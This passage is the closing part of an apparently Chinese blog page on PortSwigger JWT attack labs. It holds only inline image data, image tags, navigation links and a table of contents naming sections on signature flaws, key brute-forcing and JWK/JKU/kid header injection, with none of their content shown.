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/v2LFjamrq8uXLKysrly5d2rNnz+2337579+6JdgAAAN8EA+/ixYsnTpw4d+7crbfeunfv3p07d3ZWnT179plnnjl+/Pi+fftyuVwmk5lcNwAAEJMLvIsXL37ve9/btm3b+9///qmpqZ61u3fv3r179759+x5//PELFy68613vIvMAABM1kZtWms3miRMntm3bdvDgwf6069izZ8/BgwfPnj375JNPTqIbAAB0TCTwnnvuuXPnzt15551btmxJ3nLXrl3vfOc7n3766fPnz0+iJwAA+CYSeE899dStt96aMLYLuvHGG6+99trTp0/3rVFlI2uU1YBFA7lWNmu5I+2yjmXXnCobWct1rYHndYhNRisIAGsq/cBbXl5eXl7eu3fv8LvcfPPNL730Uuo9GcmIUarKjitt25xkl1ZhFT8QSCnT7UPqBdfGan6WArCppH/TyiuvvLJjx47gPZkDXXfddRcuXFhZWRlyULj+lFtTpl3flJ/skeR02rGXdkEAGFP6I7xLly7t2LFjpF387S9dujTKTv6UomtlW8LTi4HltfB+qmz07eJaWcNRQjlGd2lcZSGEcB1HmXmzu7fPKJd75jkji/hzfp1+9AwrEnbxV1luSkfRYla8iimL9XqxHVFRxfvEH3V/wfBesV+16HaHOvbwZq01oReJZ3joU9fXGQCbR/qBd9VVVzWbzZF2uXz5shBiFU8muFYt73me53kV07U6yaHKhqXsuud5nlefVuFPO1dUuru0PrPMile3pZB23fO8ihmqULeV1ZtJte50pmtlO21VRK3n8zu2iGtZfj8qpnKszprkXfyDrZjpHEX8WY0q3nviY496iPrRX7Wkdgcee3izui1dK5sNvOhsFn1ORjp1wc4A2ETSD7zt27efP39+pMzzb9EcdVwohDAr7Q8d07alOul/KrmOo0y7NbyQxfCFNrPYHnfIaSmUisyAYAVp5qWqud3tVNlxZd70q7g1V8S0lVhE2hV/TbDjg3bpVh//KBIMLp5w1MPUj/yqJbY75LG3K0szLzv7SDPf3WzIczL0FwLAJvL/AdGiT02BEAYdAAAAAElFTkSuQmCC" width="592" height="334" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20250521222628828" src="/assets/images/image-20250521222628828-9a7708dd95e8e9d71fe1b5550e54f6c3.png" width="1865" height="612" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/PortSwigger/web-security/JWT.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/PortSwigger/web-security/API测试"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">API测试</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/PortSwigger/web-security/SQL注入"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">SQL注入</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#jwt-attacks" class="table-of-contents__link toc-highlight">JWT attacks</a></li><li><a href="#什么是jwt" class="table-of-contents__link toc-highlight">什么是JWT</a><ul><li><a href="#jwt-格式" class="table-of-contents__link toc-highlight">JWT 格式</a></li><li><a href="#jwt-签名" class="table-of-contents__link toc-highlight">JWT 签名</a></li><li><a href="#jwt-vs-jws-vs-jwe" class="table-of-contents__link toc-highlight">JWT vs JWS vs JWE</a></li></ul></li><li><a href="#jwt签名的缺陷漏洞" class="table-of-contents__link toc-highlight">JWT签名的缺陷漏洞</a><ul><li><a href="#接受任意签名" class="table-of-contents__link toc-highlight">接受任意签名</a></li><li><a href="#接受未签名的令牌" class="table-of-contents__link toc-highlight">接受未签名的令牌</a></li></ul></li><li><a href="#暴力破解密钥" class="table-of-contents__link toc-highlight">暴力破解密钥</a></li><li><a href="#jwt-头部参数注入" class="table-of-contents__link toc-highlight">JWT 头部参数注入</a><ul><li><a href="#通过jwk注入自签名" class="table-of-contents__link toc-highlight">通过<code>JWK</code>注入自签名</a></li><li><a href="#通过jku注入自签名" class="table-of-contents__link toc-highlight">通过<code>JKU</code>注入自签名</a></li><li><a href="#通过kid注入自签名" class="table-of-contents__link toc-highlight">通过<code>kid</code>注入自签名</a></li></ul></li><li><a href="#labs" class="table-of-contents__link toc-highlight">labs</a><ul><li><a href="#未经验证的签名" class="table-of-contents__link toc-highlight">未经验证的签名</a></li><li><a href="#缺陷的签名认证" class="table-of-contents__link toc-highlight">缺陷的签名认证</a></li><li><a href="#弱密钥绕过验证" class="table-of-contents__link toc-highlight">弱密钥绕过验证</a></li><li><a href="#jwk-头部注入" class="table-of-contents__link toc-highlight">JWK 头部注入</a></li><li><a href="#jku-头部注入" class="table-of-contents__link toc-highlight">JKU 头部注入</a></li><li><a href="#kid-头部路径遍历" class="table-of-contents__link toc-highlight">kid 头部路径遍历</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Blog, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>